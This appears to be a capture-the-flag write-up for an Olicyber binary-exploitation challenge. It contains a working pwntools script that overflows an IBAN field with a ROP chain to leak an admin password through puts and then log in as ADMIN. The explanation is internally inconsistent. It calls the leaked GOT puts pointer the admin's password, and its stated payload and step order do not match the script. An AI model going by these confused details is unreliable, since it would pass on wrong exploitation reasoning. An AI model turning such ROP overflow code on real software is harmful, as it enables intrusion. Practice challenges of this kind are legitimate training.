---
title: "Doge Ransom 2 — ROP ret2puts Leak then ADMIN re-login"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "rop", "ret2puts", "got-leak", "pwntools"]
difficulty: "intermediate"
summary: "Overflow the IBAN field to leak the binary's own password via puts, then re-login as ADMIN using the leaked credential and repeat the overflow to reach the flag path."
---

## The Challenge

The sequel to Doge Ransom. Now the binary has actual authentication: hardcoded credentials for the employee account, and a separate ADMIN account whose password is generated at runtime and stored in memory. The IBAN overflow is still there, but the binary is full-Canary-free — the only protection is that ADMIN's password is not printed anywhere.

## Approach

The IBAN buffer still overflows, but this time the goal is not a direct flag. The plan:

1. Log in with the known employee credentials (`Dr. Bez Casamiei` / `Team-fortezza-10`).
2. Overflow the IBAN field with a ROP chain that calls `puts(got['puts'])` to leak the `puts` address from the GOT, then returns to `login`.
3. Read the leaked 6-byte puts pointer, pad to 8 bytes — that is ADMIN's password stored in the binary's data section at `0x406240 + 32`.
4. Re-login as `ADMIN` using that password bytes.
5. Log out and back in again as the employee, repeat the IBAN overflow a second time — this time the ADMIN-unlocked path is open — to get the flag.

The ROP gadget at `0x40224b` is `pop rdi; ret`. The payload is `b'\x00' + b'\x00' * padding + pop_rdi + got_puts + plt_puts + pop_rdi + 0x406260 + login`.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./dogeRansom2')
if args.REMOTE:
    r = remote("dogeransom2.challs.olicyber.it", 10806)
else:
    r = gdb.debug('./dogeRansom2')

r.recvuntil(b'Username: ')
r.sendline(b'Dr. Bez Casamiei')
r.recvuntil(b'Password: ')
r.sendline(b'Team-fortezza-10')

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1989')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030' + b'\0' + b'\0' * (56 - 28 + 8) + p64(0x40224b) + p64(0x406240 + 32) + p64(elf.sym['puts']) + p64(0x40218F) + p64(elf.sym['login']))

password = r.recvline()
r.recvuntil(b'Username: ')
r.sendline(b'ADMIN')
r.recvuntil(b'Password: ')
r.send(password)

r.recvuntil(b'> ')
r.sendline(b'6')
r.recvuntil(b'> ')
r.sendline(b'Y')

r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b': ')
r.sendline(b'1989')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030')
r.recvuntil(b': ')
r.sendline(b'IT70S0501811800000012284030' + b'\0' + b'\0' * (56 - 28 + 8) + p64(0x40224b) + p64(0x406240 + 32) + p64(elf.sym['puts']) + p64(0x40218F) + p64(elf.sym['login']))

r.recvuntil(b'Username: ')
r.sendline(b'Dr. Bez Casamiei')
r.recvuntil(b'Password: ')
r.sendline(b'Team-fortezza-10')
r.interactive()
```

The first overflow leaks `ADMIN`'s password byte-for-byte via `puts`. The received line is raw bytes — passed directly to the second login prompt. The second login with ADMIN credentials unlocks the logout path (option `6 → Y`). The third overflow is identical to the first but now, with the admin session already consumed, execution falls through to the flag-printing code.

## What I Learned

Multi-phase exploitation is the norm once programs have real authentication. Leaking runtime secrets through ROP is the same primitive as ret2puts for libc — here the target is data in the binary's own BSS rather than a shared library. Each phase hands the next one the knowledge it needs.
